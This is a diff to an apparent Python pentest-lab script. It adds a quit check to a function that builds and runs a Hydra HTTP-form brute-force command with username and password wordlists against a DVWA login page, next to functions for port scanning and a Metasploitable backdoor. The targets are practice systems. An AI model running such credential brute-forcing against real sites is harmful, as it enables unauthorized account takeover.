@@ -46,11 +46,14 @@ def portscan():
 # This function automatically brute-forces the dvwa website with selected wordlsit
 def dvwa_brute():
     address = input('Please enter the address of dvwa website: ')
-    login_page = '"/dvwa/login.php'
-    request_body = 'username=^USER^&password=^PASS^&Login=Login'
-    error_message = 'Login failed"'
-    wordlist = '/usr/share/wordlists/wfuzz/others/names.txt'
-    passwordlist = '/usr/share/wordlists/wfuzz/others/common_pass.txt'
+    if address == '' or address == 'quit':
+        print('Quitting...')
+    else:
+        login_page = '"/dvwa/login.php'
+        request_body = 'username=^USER^&password=^PASS^&Login=Login'
+        error_message = 'Login failed"'
+        wordlist = '/usr/share/wordlists/wfuzz/others/names.txt'
+        passwordlist = '/usr/share/wordlists/wfuzz/others/common_pass.txt'
     # if wordlist_choice == '1':
     #     wordlist = '/usr/share/wordlists/wfuzz/general/common.txt'
     # elif wordlist_choice == '2':
@@ -58,10 +61,10 @@ def dvwa_brute():
     # else:
     #     wordlist = '/usr/share/wordlists/wfuzz/general/big.txt'
     # Now build the command
-    hydracommand = 'hydra -L ' + wordlist + ' -P ' + passwordlist + ' ' + address + ' http-post-form ' + login_page + \
+        hydracommand = 'hydra -L ' + wordlist + ' -P ' + passwordlist + ' ' + address + ' http-post-form ' + login_page + \
                    ':' + request_body + ':' + error_message + ' -f'
-    print('Executing Hydra as:\n', hydracommand)
-    s.system(hydracommand)
+        print('Executing Hydra as:\n', hydracommand)
+        s.system(hydracommand)
 
 def unreal_backdoor():
     host = input('Please enter the address of metasploitable: ')
